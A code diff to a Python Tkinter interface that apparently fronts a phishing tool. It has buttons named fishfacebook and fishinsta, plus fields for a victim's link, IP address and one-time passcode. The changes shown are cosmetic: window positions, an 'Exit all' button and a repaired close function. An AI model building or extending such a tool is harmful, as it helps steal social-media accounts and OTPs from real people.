@@ -43,7 +43,7 @@ def sites():
 	
 		ip = Button(root4,text="ip", command= ipfinder)
 		ip.grid(row=2, column=0)
-		ipplace= Entry(root4, width=60, font="Calibri 10")
+		ipplace= Entry(root4, width=60,height=50, font="Calibri 10")
 		ipplace.grid(row=2, column=2)
 		ipplace.insert(INSERT, "click ip to update")
 		
@@ -95,9 +95,14 @@ def sites():
 			ipplace.delete(0, END)
 			ipplace.insert(INSERT, j.read())
 			#ip.config(root3,text="ip2location", command= iplocater)
+		def destroy():
+			root.destroy()
+			root1.destroy()
+			root3.destroy()
+			root4.destroy()	
 		root3 = Tk()
 		root3.title("Facebook link")
-		
+		root3.geometry("800x300+400+430")
 		copyplace = Entry(root3, width=60, font="Calibri 10")
 		copyplace.grid(row=0,column=2)
 		copyplace.insert(INSERT, "click copy link to get link")
@@ -128,12 +133,11 @@ def sites():
 		otparea = Entry(root3, width=60, font="Calibri 10")
 		otparea.grid(row=5,column=2)
 		otparea.insert(INSERT, "click OTP to update")
+		
+		closeall=Button(root3, text="Exit all",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= destroy).grid(row=6, column=2)
 		root3.mainloop()
-	def destroy():
-		root1.destroy
-		root.destroy
 	root1 = Tk()
-	root1.geometry('500x300')
+	root1.geometry('500x100+500+760')
 	root1.title("coose option")
 	option1 = Button(root1, text = 'Facebook',font=('Times New Roman', 18,'bold'), bg="blue", fg="white", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command = fishfacebook).grid(row = 0, column = 0)
 	option1 = Button(root1, text = 'instagram',font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="pink", activeforeground="red", cursor="hand2", relief=SUNKEN,command = fishinsta).grid(row = 0, column = 1)
@@ -149,7 +153,7 @@ fi
 os.system("""if [ ! -d process ]; then mkdir -p process; fi""")	
 root=Tk()
 root.title("practise")
-root.geometry("300x100")
+root.geometry("300x100+600+900")
 button1=Button(root, text="Start!", font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command=sites).grid(row=0, column=3)
 button2=Button(root, text="exit", font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command=root.destroy).grid(row=0, column=4)
 root.mainloop()
